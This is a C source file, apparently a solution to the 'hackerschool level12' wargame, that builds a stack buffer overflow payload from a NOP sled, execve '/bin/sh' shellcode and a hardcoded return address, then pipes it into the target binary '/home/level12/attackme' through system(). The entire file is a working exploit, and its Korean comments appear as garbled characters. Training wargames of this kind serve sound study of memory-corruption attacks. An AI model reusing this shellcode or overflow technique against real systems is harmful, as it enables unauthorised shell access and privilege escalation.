/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level12
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 272   /* NOP(219) + shellcode(45) + sfp(4) + ret(4)*/

// ��ü��� �����Ű�� ���ڵ� + char str[256] �迭�� ���� �ּ�
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh"
    "\xd0\xf9\xff\xbf";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
	// ���ڵ��� ���� Ȯ��
    shellLen = strlen(shellcode);
	
	// ���ڵ� �պκб��� NOP �Ҵ�
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
		
    // NOP �ڿ� ���ڵ� �Ҵ�
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = shellcode[j];
    
    // (perl -e 'print "NOPs....Shellcode...[SFP][RET]"'; cat) | /home/level12/attackme ��ɾ�
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level12/attackme");
    strcat(cmdBuf, "\x0a");
	system(cmdBuf);
}